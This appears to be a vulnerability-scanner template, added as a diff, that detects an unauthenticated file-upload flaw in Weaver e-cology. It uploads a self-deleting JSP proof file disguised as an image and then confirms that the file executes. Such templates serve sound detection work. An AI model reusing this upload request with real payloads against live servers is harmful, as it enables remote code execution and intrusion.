@@ -1,0 +1,53 @@
+id: weaver-e-cology-ktreeuploadaction-arbitrary-file-upload
+
+info:
+  name: weaver e-cology KtreeUploadAction arbitrary file upload
+  author: SleepingBag945
+  severity: critical
+  description: 泛微E-Cology存在文件上传漏洞，攻击者可以通过KtreeUploadAction.jsp上传任意文件并且进一步进行利用
+  reference:
+    - https://buaq.net/go-117479.html
+  tags: ecology,upload,fileupload,intrusive
+
+http:
+  - raw:
+      - |
+        POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywgljfvib
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundarywgljfvib
+        Content-Disposition: form-data; name="test"; filename="{{randstr}}.jsp"
+        Content-Type: image/jpeg
+
+        <%out.print(43997 * 41858);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundarywgljfvib--
+
+      - |
+        GET {{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip
+
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        group: 1
+        regex:
+          - "','url':'(.*?)','title"
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl: 
+          - "status_code_1 == 200 && contains(body_1,'original')"
+          - "contains(body_2, '1841626426') && status_code_2 == 200"
+        condition: and
+
+# Enhanced by md on 2022/10/31
